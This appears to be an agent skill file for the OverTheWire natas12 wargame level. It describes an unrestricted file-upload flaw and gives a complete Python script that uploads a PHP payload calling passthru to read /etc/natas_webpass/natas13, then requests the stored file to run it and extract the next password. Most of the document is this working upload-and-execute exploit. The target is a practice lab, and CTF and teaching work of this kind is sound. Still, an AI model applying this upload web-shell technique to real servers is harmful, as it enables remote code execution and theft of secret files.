---
name: natas-12
description: >-
  Use when solving OverTheWire natas12: given natas12 credentials, upload a PHP
  payload while setting the client-controlled 'filename' field to a .php name
  (the server does no extension check), then fetch the stored file so passthru()
  prints and returns the natas13 password.
---
# natas12

Solve OverTheWire **natas12** and print the **natas13** password.

## Weakness

The upload form carries a hidden `filename` field that the server trusts verbatim to name the stored file. It never checks the extension or the content type, so changing `filename` from the random `.jpg` to a `.php` name makes the server save executable PHP under `upload/`. Fetching that file runs it.

## Inputs

- `NATAS12_USER` (usually `natas12`)
- `NATAS12_PASS` (current natas12 password)

## Run

The natas hosts are reachable only from the user's desktop (x1c), not the box. Copy `solve.py` (below) to x1c and run it there with Python:

```
python natas12-solve.py <NATAS12_USER> <NATAS12_PASS>
```

It prints the natas13 password on stdout. Verify:

```
curl.exe -s -o NUL -w "%{http_code}" -u natas13:<PRINTED_PASS> http://natas13.natas.labs.overthewire.org/
```

Expect `200`.

## solve.py

```python
#!/usr/bin/env python3
"""Solve natas12: the server names the stored upload from the client-controlled
'filename' field with no extension check. Upload PHP but set filename to .php."""
import base64, re, sys, urllib.request, uuid

BASE = "http://natas12.natas.labs.overthewire.org"
PAYLOAD = b'<?php passthru("cat /etc/natas_webpass/natas13"); ?>'

def multipart(fields, file_field, file_name, file_bytes):
    boundary = "----natas12boundary" + uuid.uuid4().hex
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; filename=\"{file_name}\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n".encode()
        + file_bytes + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts), boundary

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <natas12_user> <natas12_pass>", file=sys.stderr)
        sys.exit(1)
    user, password = sys.argv[1], sys.argv[2]
    auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()

    php_name = "exploit.php"
    fields = {"MAX_FILE_SIZE": "1000", "filename": php_name}
    body, boundary = multipart(fields, "uploadedfile", php_name, PAYLOAD)
    req = urllib.request.Request(BASE + "/index.php", data=body, headers={
        "Authorization": auth,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    html = urllib.request.urlopen(req, timeout=30).read().decode("utf-8", errors="replace")
    m = re.search(r"(upload/[A-Za-z0-9]+\.php)", html)
    if not m:
        print("No uploaded .php path returned", file=sys.stderr); print(html, file=sys.stderr); sys.exit(1)
    path = m.group(1)

    req2 = urllib.request.Request(f"{BASE}/{path}", headers={"Authorization": auth})
    out = urllib.request.urlopen(req2, timeout=30).read().decode("utf-8", errors="replace")
    pw = re.search(r"([A-Za-z0-9]{32})", out)
    if not pw:
        print("No password in executed output", file=sys.stderr); print(out, file=sys.stderr); sys.exit(1)
    print(pw.group(1))

if __name__ == "__main__":
    main()
```
